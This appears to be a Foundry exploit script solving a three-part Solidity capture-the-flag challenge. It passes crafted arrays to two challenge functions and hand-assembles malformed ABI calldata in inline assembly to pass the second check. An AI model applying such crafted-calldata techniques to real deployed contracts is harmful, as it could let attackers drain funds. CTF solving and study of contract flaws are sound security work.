// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.0;

import "../lib/forge-std/src/Script.sol";
import "../src/Setup.sol";

contract ExploitScript is Script {

    Setup setup;
    Challenge chall;

    function run() public {
        chall = setup.challenge();

        vm.startBroadcast();

        {
            uint256 n = 1;
            uint256[] memory f = new uint256[](1); f[0] = 1;
            uint256[] memory t = new uint256[](2); t[0] = 2; t[1] = 2;
            uint256[] memory s1 = new uint256[](2); s1[0] = 1; s1[1] = 1;
            uint256[] memory s2 = new uint256[](2); s2[0] = 2; s2[1] = 2;
            chall.challenge1(n, f, t, s1, s2);
            require(chall.solved1());
        }

        {
            bytes memory data = new bytes(19 * 0x20);
            assembly {
                mstore(add(data, 0x20), 1)
                mstore(add(data, 0x40), 0xa0)
                mstore(add(data, 0x60), 0xe0)
                mstore(add(data, 0x80), 0x140)
                mstore(add(data, 0xa0), 0x200)
                mstore(add(data, 0xc0), 1)
                mstore(add(data, 0xe0), 1)
                mstore(add(data, 0x100), 2)
                mstore(add(data, 0x120), 2)
                mstore(add(data, 0x140), 2)
                mstore(add(data, 0x160), 2)
                mstore(add(data, 0x180), 1)
                mstore(add(data, 0x1a0), 1)
                mstore(add(data, 0x1c0), 0)
                mstore(add(data, 0x1e0), 0)
                mstore(add(data, 0x200), 0)
                mstore(add(data, 0x220), 2)
                mstore(add(data, 0x240), 1)
                mstore(add(data, 0x260), 7287299196098965986618773431837823862418990511618160691753196093008505079825)
            }
            address(chall).call(abi.encodePacked(chall.challenge2.selector, data));
            require(chall.solved2());
        }

        {
            uint256 n = 1;
            uint256[] memory f = new uint256[](1); f[0] = 1;
            uint256[] memory t = new uint256[](2); t[0] = 4; t[1] = 3;
            uint256[] memory s1 = new uint256[](2); s1[0] = 2; s1[1] = 2;
            uint256[] memory s2 = new uint256[](2); s2[0] = 2; s2[1] = 2;
            chall.challenge3(n, f, t, s1, s2);
            require(chall.solved3());
        }
        
        chall.declareSolved();
        require(chall.solved(), "failed to solve");

        vm.stopBroadcast();
    }
}